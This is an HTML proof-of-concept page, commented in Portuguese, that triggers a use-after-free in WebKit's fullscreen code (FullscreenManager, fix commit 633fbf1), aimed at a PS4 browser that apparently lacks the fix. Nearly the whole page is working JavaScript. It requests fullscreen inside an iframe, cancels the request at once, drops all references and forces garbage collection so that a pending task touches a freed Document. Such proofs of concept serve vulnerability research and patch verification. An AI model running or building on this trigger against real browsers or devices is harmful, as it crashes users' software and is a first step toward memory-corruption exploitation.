<!DOCTYPE html>
<html>
<head><title>FullscreenManager UAF PoC — 633fbf1</title></head>
<body>

<button id="btn" onclick="run(this)">&#9654; Run PoC (clique = gesto obrigatorio)</button>
<pre id="log"></pre>

<script>
/*
 * PoC: Use-After-Free em FullscreenManager::requestFullscreenForElement
 * Commit fix: 633fbf1 | Bug: webkit.org/263140
 *
 * Caminho vulneravel:
 *   failedPreflights:
 *     promise->reject()          <- pode libertar Document (DeferredPromise = ultima ref)
 *     m_document.eventLoop()     <- UAF se Document foi destruido acima
 *
 * Fix ausente no fonte PS4:
 *   Ref document { protectedDocument() };  <- NAO encontrado em FullscreenManager.cpp
 */

/* ── GC via pressao de alocacao (fornecida) ── */
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

/* ── GC complementar via ArrayBuffer grande ── */
function gcHeavy() {
    var bufs = [];
    for (var i = 0; i < 30; i++) {
        try { bufs.push(new ArrayBuffer(10 * 1024 * 1024)); } catch(e) { break; }
    }
    bufs = null;
    gc();
    gc();
}

var L = document.getElementById('log');
function log(s) { L.textContent += '[' + new Date().toTimeString().slice(0,8) + '] ' + s + '\n'; }

/*
 * Sequencia corrigida vs teste anterior:
 *
 *  1. requestFullscreen()           -> DeferredPromise criada (promise != null)
 *  2. webkitCancelFullScreen()      -> m_pendingFullscreenElement = nullptr  [SINCRONO]
 *  3. Zerar TODAS as refs JS        -> Document sem raizes JS
 *  4. gcHeavy()                     -> forcar coleta ANTES da task async rodar
 *  5. Task async dispara:
 *       m_pendingFullscreenElement(null) != element -> failedPreflights(element, promise)
 *         promise->reject()         -> se Document foi coletado no passo 4: UAF aqui
 *         m_document.eventLoop()    <- CRASH se m_document foi destruido
 */
function attempt(n) {
    var iframe = document.body.appendChild(document.createElement('iframe'));
    var iframeDoc  = iframe.contentDocument;
    var div = iframeDoc.body.appendChild(document.createElement('div'));

    /* PASSO 1: requestFullscreen — isFromPrefixedAPI = false, promise != null */
    var p = div.requestFullscreen();
    log('[' + n + '] requestFullscreen -> ' + (p instanceof Promise ? 'Promise (vulneravel)' : typeof p));

    if (p instanceof Promise) {
        p.catch(function(e) {
            /* este callback roda DEPOIS do UAF (microtask apos failedPreflights) */
            /* se chegar aqui sem crash = fix presente ou GC nao coletou o Document */
            log('[' + n + '] catch pos-UAF: ' + e + '  <- se nao crashou, Document sobreviveu');
        });
    }

    /* PASSO 2: cancelar SINCRONAMENTE — seta m_pendingFullscreenElement = nullptr
     * Garante path: "mismatch" na task, nao "isConnected" (mais previsivel) */
    iframeDoc.webkitCancelFullScreen();
    log('[' + n + '] webkitCancelFullScreen() -> m_pendingFullscreenElement = null');

    /* PASSO 3: zerar TODAS as referencias JS ao Document do iframe */
    div      = null;
    iframeDoc = null;
    document.body.removeChild(iframe);
    iframe   = null;
    /* p (Promise JS) tambem zerada — DeferredPromise C++ pode ser a unica ref ao Document */
    p        = null;

    /* PASSO 4: GC MAXIMO antes da task async — Document deve ter zero raizes JS agora */
    gcHeavy();
    log('[' + n + '] gcHeavy() concluido — task async pendente na fila do eventLoop');

    /* PASSO 5: task async do requestFullscreenForElement vai rodar no proximo tick:
     *   if (m_pendingFullscreenElement != element.ptr())  <- TRUE (cancelamos no passo 2)
     *       failedPreflights(element, promise)
     *         promise->reject()                           <- UAF se Document coletado acima
     *         m_document.eventLoop().queueTask(...)       <- CRASH esperado aqui
     */
}

function run(btn) {
    btn.disabled = true;
    log('=== PoC: FullscreenManager UAF | 633fbf1 ===');
    log('C++: Ref document{protectedDocument()} ausente em FullscreenManager.cpp');
    log('Path: requestFullscreen(Promise) + webkitCancelFullScreen[sync] + gcHeavy');
    log('');

    var TENTATIVAS = 5;

    for (var i = 0; i < TENTATIVAS; i++) {
        attempt(i);
    }

    setTimeout(function() {
        log('');
        log('=== ' + TENTATIVAS + ' tentativas processadas ===');
        log('Se nenhum crash: fix presente no binario OU GC nao coletou o Document');
        log('Se crash/freeze antes daqui: UAF confirmado');
    }, 3000);
}
</script>

</body>
</html>
